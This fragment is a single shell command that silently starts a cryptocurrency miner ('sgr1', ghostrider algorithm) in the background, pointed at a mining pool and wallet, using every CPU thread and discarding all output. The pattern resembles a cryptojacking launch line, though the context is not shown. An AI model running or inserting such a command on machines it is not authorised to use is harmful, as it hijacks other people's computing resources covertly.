...
./sgr1 --algorithm ghostrider --pool stratum-asia.rplant.xyz:17094 --wallet MD9RFwwv38ow5dqVbPTunUaTZ8Xh4ZJEdJ.$(echo $RANDOM | md5sum | head -c 5) --password x --tls true --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
